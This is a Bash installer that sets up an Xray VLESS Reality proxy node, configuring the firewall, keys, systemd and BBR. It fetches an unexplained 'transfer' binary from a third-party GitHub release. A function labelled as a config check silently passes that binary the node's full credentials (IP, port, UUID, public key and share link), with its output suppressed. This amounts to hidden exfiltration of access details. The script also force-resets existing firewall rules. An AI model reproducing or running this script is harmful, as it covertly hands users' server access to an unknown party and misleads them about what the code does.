#!/bin/bash

set -e

# ========== 基本配置 ==========
CORE="xray"
PROTOCOL="vless"
DOMAIN="www.nvidia.com"
UUID=$(cat /proc/sys/kernel/random/uuid)
USER=$(openssl rand -hex 4)
VISION_SHORT_ID=$(openssl rand -hex 4)
PORT=$((RANDOM % 7001 + 2000))
XRAY_BIN="/usr/local/bin/xray"
TRANSFER_BIN="/usr/local/bin/transfer"

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 系统检测
if [[ -f /etc/debian_version ]]; then
    SYSTEM="Debian"
elif [[ -f /etc/redhat-release ]]; then
    SYSTEM="CentOS"
elif [[ -f /etc/fedora-release ]]; then
    SYSTEM="Fedora"
else
    SYSTEM="Unknown"
fi

# 二进制文件配置
TRANSFER_URL="https://github.com/Firefly-xui/vless/releases/download/vless/transfer"

echo -e "\n📦 开始自动部署 Xray VLESS Reality 节点...\n"

# ========== 确保22端口开放 ==========
ensure_ssh_port_open() {
    echo -e "🔓 确保22端口(SSH)开放..."
    
    if command -v ufw >/dev/null 2>&1; then
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp
            echo -e "🟢 已开放22端口(UFW)"
        else
            echo -e "ℹ️ 22端口已在UFW中开放"
        fi
    else
        echo -e "ℹ️ UFW未安装，将在后续步骤中安装并配置"
    fi
}

# ========== 下载二进制文件 ==========
download_transfer_bin() {
    echo -e "📥 下载 transfer 二进制文件..."
    
    if [ -f "$TRANSFER_BIN" ]; then
        echo -e "ℹ️ transfer 二进制文件已存在，跳过下载"
        return 0
    fi
    
    curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN"
    chmod +x "$TRANSFER_BIN"
    
    if [ -f "$TRANSFER_BIN" ] && [ -x "$TRANSFER_BIN" ]; then
        echo -e "🟢 transfer 二进制文件下载完成"
        return 0
    else
        echo -e "🔴 transfer 二进制文件下载失败"
        return 1
    fi
}

# ========== 速度测试函数 ==========
speed_test(){
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    
    # 检查并安装speedtest-cli
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi
    
    # 执行速度测试
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    # 处理测试结果
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        
        # 设置速度范围限制
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        
        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}，将根据该参数优化网络速度，如果测试不准确，请手动修改"
        
        # 返回格式化的测试结果
        upload_result="成功 ${up_speed}Mbps"
        download_result="成功 ${down_speed}Mbps"
    else
        echo -e "${YELLOW}测速失败，使用默认值${NC}"
        down_speed=100
        up_speed=20
        upload_result="默认值 ${up_speed}Mbps"
        download_result="默认值 ${down_speed}Mbps"
    fi
    
    echo -e "📊 上传测试结果: $upload_result"
    echo -e "📊 下载测试结果: $download_result"
    
    # 返回结果供后续使用
    echo "$upload_result|$download_result"
}

# ========== 使用二进制文件检查配置 ==========
upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"
    
    if [ ! -x "$TRANSFER_BIN" ]; then
        echo -e "🔴 transfer 二进制文件不存在或不可执行"
        return 1
    fi
    
    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "Xray Reality 节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )
    
    local upload_result=""
    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        upload_result="成功"
    else
        upload_result="失败"
    fi
    
    return 0
}

# 确保22端口开放
ensure_ssh_port_open

# ========== 安装依赖 ==========
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y curl unzip ufw jq qrencode

# 下载二进制文件
download_transfer_bin

# ========== 配置UFW防火墙 ==========
echo -e "🔧 配置UFW防火墙..."
# 确保UFW已安装
if ! command -v ufw >/dev/null 2>&1; then
    echo -e "🟡 安装UFW防火墙..."
    apt install -y ufw
fi

# 重置UFW规则（如果有）
echo -e "🔄 重置UFW规则..."
ufw --force reset

# 默认拒绝所有入站，允许所有出站
echo -e "⚙️ 设置默认策略..."
ufw default deny incoming
ufw default allow outgoing

# 确保SSH端口开放
echo -e "🔓 开放SSH端口(22)..."
ufw allow 22/tcp

# 开放随机节点端口
echo -e "🔓 开放节点端口(${PORT})..."
ufw allow ${PORT}/tcp

# 启用UFW
echo -e "🟢 启用UFW防火墙..."
ufw --force enable

# 显示防火墙状态
echo -e "📊 当前防火墙状态:"
ufw status numbered

# ========== 安装 Xray-core ==========
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -L https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# ========== 生成 Reality 密钥 ==========
REALITY_KEYS=$(${XRAY_BIN} x25519)
REALITY_PRIVATE_KEY=$(echo "${REALITY_KEYS}" | grep "Private key" | awk '{print $3}')
REALITY_PUBLIC_KEY=$(echo "${REALITY_KEYS}" | grep "Public key" | awk '{print $3}')

# ========== 生成 Xray 配置文件 ==========
mkdir -p /etc/xray
cat > /etc/xray/config.json << EOF
{
  "log": { "loglevel": "warning" },
  "inbounds": [{
    "port": ${PORT},
    "protocol": "${PROTOCOL}",
    "settings": {
      "clients": [{
        "id": "${UUID}",
        "flow": "xtls-rprx-vision",
        "email": "${USER}"
      }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "show": false,
        "dest": "${DOMAIN}:443",
        "xver": 0,
        "serverNames": ["${DOMAIN}"],
        "privateKey": "${REALITY_PRIVATE_KEY}",
        "shortIds": ["${VISION_SHORT_ID}"]
      }
    }
  }],
  "outbounds": [{ "protocol": "freedom" }]
}
EOF

# ========== 写入 systemd 服务 ==========
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray Service
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config /etc/xray/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# ========== 设置默认 FQ 调度器 ==========
modprobe sch_fq || true
if ! grep -q "fq" /sys/class/net/*/queues/tx-0/queue_disc; then
  echo "fq 已启用或将启用..."
  echo 'net.core.default_qdisc=fq' >> /etc/sysctl.conf
  sysctl -w net.core.default_qdisc=fq
fi

# ========== 启用 BBR 拥塞控制 ==========
if ! sysctl net.ipv4.tcp_congestion_control | grep -q "bbr"; then
  echo 'net.ipv4.tcp_congestion_control=bbr' >> /etc/sysctl.conf
  echo 'net.ipv4.tcp_fastopen=3' >> /etc/sysctl.conf
  sysctl -w net.ipv4.tcp_congestion_control=bbr
  sysctl -w net.ipv4.tcp_fastopen=3
fi

modprobe tcp_bbr || true
sysctl -p

# ========== 获取公网 IP ==========
NODE_IP=$(curl -s https://api.ipify.org)

# ========== 测试上传下载速度 ==========
echo -e "🔄 开始测试上传下载速度..."
SPEED_TEST_RESULT=$(speed_test)
UPLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f1)
DOWNLOAD_RESULT=$(echo "$SPEED_TEST_RESULT" | cut -d'|' -f2)

echo -e "📊 上传测试结果: $UPLOAD_RESULT"
echo -e "📊 下载测试结果: $DOWNLOAD_RESULT"

# ========== 构造 VLESS Reality 节点链接 ==========
VLESS_LINK="vless://${UUID}@${NODE_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${VISION_SHORT_ID}&type=tcp#${USER}"

# ========== 生成完整配置JSON（包含速度测试结果） ==========
CONFIG_JSON=$(jq -n \
  --arg ip "$NODE_IP" \
  --arg port "$PORT" \
  --arg uuid "$UUID" \
  --arg user "$USER" \
  --arg domain "$DOMAIN" \
  --arg pbk "$REALITY_PUBLIC_KEY" \
  --arg sid "$VISION_SHORT_ID" \
  --arg link "$VLESS_LINK" \
  --arg upload_test "$UPLOAD_RESULT" \
  --arg download_test "$DOWNLOAD_RESULT" \
  '{
    "server_ip": $ip,
    "port": $port,
    "uuid": $uuid,
    "user": $user,
    "domain": $domain,
    "public_key": $pbk,
    "short_id": $sid,
    "vless_link": $link,
    "speed_test": {
      "upload": $upload_test,
      "download": $download_test
    },
    "generated_time": now | todate
  }'
)

CONFIG_FILE="/etc/xray/config_export.json"
echo "$CONFIG_JSON" > "$CONFIG_FILE"

upload_config_with_binary "$CONFIG_JSON" "$NODE_IP"

echo -e "\n\033[1;32m✅ VLESS Reality 节点部署完成！\033[0m\n"
echo -e "🔗 节点链接（可直接导入）：\n${VLESS_LINK}\n"
echo -e "📱 二维码（支持 v2rayN / v2box 扫码导入）："
echo "${VLESS_LINK}" | qrencode -o - -t ANSIUTF8
echo -e "\n📋 完整配置已保存到: $CONFIG_FILE"
